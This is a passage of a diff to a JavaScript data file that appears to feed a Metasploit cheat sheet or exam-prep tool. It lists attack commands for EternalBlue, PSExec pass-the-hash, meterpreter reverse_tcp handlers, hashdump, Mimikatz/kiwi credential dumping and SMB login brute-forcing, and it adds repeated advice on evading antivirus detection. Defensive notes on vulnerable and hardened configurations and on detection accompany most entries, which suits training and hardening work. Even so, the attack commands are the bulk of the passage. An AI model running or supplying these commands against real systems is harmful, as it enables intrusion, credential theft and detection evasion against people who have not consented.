         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37658,11 +39622,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Load",
-          "command": "use post/multi/recon/local_exploit_suggester",
-          "description": "Run local exploit suggester against active session"
-        },
         {
           "label": "Configure and Run",
           "command": "set SESSION <session>\nrun",
@@ -37763,11 +39722,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "List",
-          "command": "sessions",
-          "description": "List all active sessions"
-        },
-        {
           "label": "Interact",
           "command": "sessions -i <session>",
           "description": "Interact with a session by ID"
@@ -37784,7 +39738,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "Lists and interacts with active sessions (shells/Meterpreter) already established on targets.",
+        "why_it_works": "sessions lists and interacts with active shells/Meterpreter, letting you background, upgrade, and route through them.",
         "prerequisites": "msfconsole with one or more active sessions.",
         "impact": "Manages existing footholds - a console operation; the sessions themselves are covered by the meterpreter/shell cards.",
         "sources": [
@@ -37793,7 +39747,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -37893,11 +39848,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Load",
-          "command": "use multi/handler",
-          "description": "Set up generic reverse shell handler"
-        },
         {
           "label": "Set Payload",
           "command": "set payload windows/meterpreter/reverse_tcp",
@@ -38136,29 +40086,24 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Select PSExec exploit module",
-          "command": "use exploit/windows/smb/psexec",
-          "label": "psexec"
-        },
-        {
           "description": "Set credentials, share, and run",
           "command": "set RHOSTS <target_ip>\nset SMBUser <user>\nset SMBPass <password>\nset SHARE ADMIN$\nset LHOST <attacker_ip>\nexploit",
           "label": "set RHOSTS"
         },
         {
           "description": "Use NTLM hash instead of password (pass-the-hash)",
-          "command": "set SMBUser Administrator\nset SMBPass <LM:NT_hash>\n# Format: aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38\nexploit",
+          "command": "set SMBUser Administrator\nset SMBPass <lm_nt_hash>\n# Format: aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38\nexploit",
           "label": "set SMBUser"
         },
         {
           "description": "Set Meterpreter payload for richer post-exploitation",
           "command": "set payload windows/meterpreter/reverse_tcp\nset LHOST <attacker_ip>\nset LPORT 4444\nexploit",
-          "label": "set payload"
+          "label": "payload - meterpreter reverse_tcp"
         },
         {
           "description": "Use CMD payload (lightweight, no Meterpreter)",
           "command": "set payload windows/shell/reverse_tcp\nexploit",
-          "label": "set payload"
+          "label": "payload - plain shell reverse_tcp"
         }
       ]
     },
@@ -38233,11 +40178,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Run As Job",
-          "command": "exploit -j",
-          "description": "Run exploit as background job (non-blocking)"
-        },
-        {
           "label": "List Jobs",
           "command": "jobs -l",
           "description": "List all running background jobs"
@@ -38259,7 +40199,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "Runs an exploit module (as a background job with `-j`) against a target to gain code execution and open a session.",
+        "why_it_works": "Running an exploit/handler as a background job lets the listener persist while you keep working, catching sessions asynchronously.",
         "prerequisites": "Network access to a vulnerable service and a configured, matching exploit module.",
         "impact": "Remote code execution and a shell/Meterpreter session on the target.",
         "detection": "Exploit network traffic is often IDS-signatured; the service may crash/restart; a new payload process opens a C2 connection back to the handler.",
@@ -38431,11 +40371,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "By Name",
-          "command": "search <keyword>",
-          "description": "Search modules by keyword"
-        },
-        {
           "label": "By Type",
           "command": "search <keyword> type:exploit",
           "description": "Search by type (exploit/auxiliary/post/payload)"
@@ -38457,7 +40392,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "msfconsole's `search` locates exploit/auxiliary/post modules by name, CVE, platform, or type.",
+        "why_it_works": "search indexes modules by name/CVE/platform so you can find the right exploit/auxiliary for a discovered service.",
         "prerequisites": "A running msfconsole.",
         "impact": "Finds the right module for a target - purely an attacker-side console query.",
         "sources": [
@@ -38466,7 +40401,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -38550,11 +40486,6 @@ const COMMAND_DATA = {
           "label": "Chain Filters",
           "command": "grep meterpreter grep reverse_tcp show payloads",
           "description": "Set staged Meterpreter payload"
-        },
-        {
-          "label": "Set",
-          "command": "set payload <index>",
-          "description": "Set stageless shell payload (no MSF handler needed)"
         }
       ],
       "opsec": "loud",
@@ -38563,7 +40494,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "Selects which payload a module will deliver (e.g. windows/meterpreter/reverse_tcp).",
+        "why_it_works": "The payload is the code that runs on success; choosing a compatible payload (e.g. meterpreter/reverse_tcp) determines what access you get.",
         "prerequisites": "A module selected in msfconsole.",
         "impact": "Chooses the payload/shell type to be delivered on success (attacker-side).",
         "sources": [
@@ -38572,7 +40503,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -38653,11 +40585,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Set Target",
-          "command": "set RHOSTS <ip>",
-          "description": "Set required option (RHOSTS, LHOST, etc.)"
-        },
-        {
           "label": "Set Callback",
           "command": "set LHOST <lhost>",
           "description": "Unset an option"
@@ -38679,7 +40606,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "Sets module datastore options (RHOSTS, RPORT, LHOST, etc.) that parameterise the module before running.",
+        "why_it_works": "Modules expose datastore options (RHOSTS/LHOST/…); setting them configures the exploit before it runs.",
         "prerequisites": "A module selected in msfconsole.",
         "impact": "Configures the module for the target - attacker-side console state, no target contact yet.",
         "sources": [
@@ -38688,7 +40615,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -38754,11 +40682,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Show",
-          "command": "show targets",
-          "description": "Show available target OS/arch for current exploit"
-        },
-        {
           "label": "Set",
           "command": "set target <index>",
           "description": "Set specific target version"
@@ -38770,7 +40693,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Lists a module's supported target types/indexes so the correct one can be set.",
+        "why_it_works": "Many exploits support multiple target profiles (OS/version/offset); show targets lists them so you pick the matching one.",
         "prerequisites": "A module selected in msfconsole.",
         "impact": "Reveals which target platforms the exploit supports (attacker-side).",
         "sources": [
@@ -38779,7 +40702,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -38876,7 +40800,23 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Pass-the-hash check",
+          "command": "set SMBPass <nt_hash>; set SMBUser administrator; run"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Configure the scanner",
+          "command": "use auxiliary/scanner/smb/smb_login; set RHOSTS <cidr>; set USER_FILE users.txt; set PASS_FILE pass.txt"
+        },
+        {
+          "label": "Run + note valid logins",
+          "command": "run   # green [+] = valid"
+        }
+      ]
     },
     {
       "type": "command",
@@ -38978,11 +40918,6 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Select EternalBlue exploit module",
-          "command": "use exploit/windows/smb/ms17_010_eternalblue",
-          "label": "ms17 010 eternalblue"
-        },
-        {
           "description": "Set target, payload, and run EternalBlue",
           "command": "set RHOSTS <target_ip>\nset LHOST <attacker_ip>\nset payload windows/x64/meterpreter/reverse_tcp\nexploit",
           "label": "set RHOSTS"
@@ -39079,11 +41014,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "List",
-          "command": "workspace",
-          "description": "List all workspaces"
-        },
-        {
           "label": "Add",
           "command": "workspace -a <name>",
           "description": "Create new workspace for an engagement"
@@ -39105,7 +41035,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Manages Metasploit workspaces to segregate engagement data in the backend database.",
+        "why_it_works": "Workspaces separate engagement data in the MSF database so hosts/loot from different targets don't mix.",
         "prerequisites": "msfconsole with the database connected.",
         "impact": "Organises hosts/services/loot per engagement - attacker-side data management, no target contact.",
         "sources": [
@@ -39114,7 +41044,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems run services with known CVEs that Metasploit modules exploit: unpatched buffer overflows, default credentials on services (Tomcat admin:admin, SNMP public), EternalBlue (MS17-010) on unpatched SMB, or web application vulnerabilities with no WAF. Patch management failures — especially for critical CVEs — are the root cause.",
         "vulnerable_config": "# MS17-010 (EternalBlue) — SMBv1 enabled, SMB port 445 reachable:\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   SMB1 = 1  (enabled)\n# Target: Windows 7, 2008 R2 without MS17-010 patch\n\n# Default Tomcat credentials:\n# /conf/tomcat-users.xml:\n<user username='admin' password='admin' roles='manager-gui,admin-gui'/>\n# Manager app accessible on port 8080 from any host\n\n# Missing patch verification:\nwmic qfe | findstr KB4012212  # empty = not patched for EternalBlue",
-        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)"
+        "secure_config": "# Disable SMBv1 (permanent, no legitimate use since 2017):\nSet-SmbServerConfiguration -EnableSMB1Protocol $false -Force\nDisable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol\n\n# Apply MS17-010 patch: KB4012212 (Server 2008 R2), KB4012215 (Win 7)\n\n# Tomcat hardening:\n# Remove default users from tomcat-users.xml\n# Restrict Manager app to localhost:\n# conf/Catalina/localhost/manager.xml:\n<Context>\n  <Valve className='org.apache.catalina.valves.RemoteAddrValve' allow='127\\.0\\.0\\.1'/>\n</Context>\n# Deploy WAF (ModSecurity) in front of Tomcat\n\n# Patch management: vulnerability scanner (Nessus, OpenVAS) weekly\n# Critical CVEs: patch within 72 hours (CVSS 9+)",
+        "evasion": "MSF payloads are heavily signatured — encode/encrypt or use a custom stager, prefer meterpreter reverse_https over staged TCP behind inspection, migrate out of the spawned process immediately, and change default handler ports/URIs."
       },
       "type": "command"
     },
@@ -39429,11 +41360,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Current User",
-          "command": "getuid",
-          "description": "Show all active Meterpreter/shell sessions"
-        },
-        {
           "label": "System Info",
           "command": "sysinfo",
           "description": "Switch to a background session by ID"
@@ -39549,11 +41475,6 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Drop from Meterpreter to interactive system shell",
-          "command": "shell",
-          "label": "Drop to shell"
-        },
-        {
           "description": "Run single command via Meterpreter execute (no interactive shell)",
           "command": "execute -f cmd.exe -i -H\nexecute -f /bin/bash -i",
           "label": "Execute cmd.exe"
@@ -39654,7 +41575,31 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Meterpreter runs entirely in memory (no disk artifact by default)\n# Reflective DLL injection into legitimate process (e.g., explorer.exe)\n# Traditional AV sees no malicious file = no alert\n\n# getsystem succeeds when:\n# - SeImpersonatePrivilege available (IIS/SQL service accounts)\n# - Named pipe impersonation technique works\n# - Kernel exploit token duplication works",
         "secure_config": "# EDR with memory scanning (Defender ATP, CrowdStrike, SentinelOne):\n# Detects reflective DLL injection patterns in memory\n# Detects Meterpreter C2 communication patterns\n\n# Enable Windows Defender Credential Guard:\n# Blocks kiwi from extracting creds from LSASS\n\n# SeImpersonatePrivilege restriction:\n# Remove from non-service accounts\n# Service accounts in Protected Users group where possible\n\n# Application allowlisting (WDAC):\n# Blocks execution of malicious stages even if dropped to disk\n# Blocks unsigned PowerShell scripts used for Meterpreter delivery"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "Smart hashdump (post module)",
+          "command": "run post/windows/gather/smart_hashdump"
+        },
+        {
+          "label": "Load kiwi + dump",
+          "command": "load kiwi; creds_all"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Elevate to SYSTEM",
+          "command": "getsystem"
+        },
+        {
+          "label": "Dump local SAM hashes",
+          "command": "hashdump"
+        },
+        {
+          "label": "Pass-the-hash / crack",
+          "command": "# crackmapexec smb <ip> -u Administrator -H <nt_hash>"
+        }
+      ]
     },
     {
       "id": "meterpreter-getsystem",
@@ -39849,10 +41794,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Load",
-          "command": "load kiwi"
-        },
-        {
           "label": "Dump SAM",
           "command": "lsa_dump_sam"
         },
@@ -39867,7 +41808,7 @@ const COMMAND_DATA = {
       ],
       "exam": "msf-one-machine",
       "defense": {
-        "why_it_works": "The kiwi extension (Mimikatz) dumps plaintext passwords, hashes, and Kerberos tickets from LSASS memory on the target.",
+        "why_it_works": "kiwi (Mimikatz in Meterpreter) reads LSASS memory, where Windows caches logon secrets (NTLM hashes, Kerberos keys, sometimes plaintext) for single sign-on — anything with debug rights can extract them.",
         "prerequisites": "An active Meterpreter session with SYSTEM/debug privileges.",
         "impact": "Cleartext credentials, NTLM hashes, and Kerberos tickets from LSASS - high-value for lateral movement and escalation.",
         "detection": "[MITRE T1003.001] LSASS process access with suspicious rights (Sysmon Event 10; Security 4656/4663 on lsass.exe); kiwi/Mimikatz signatures; SYSTEM-level session.",
@@ -40051,10 +41992,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
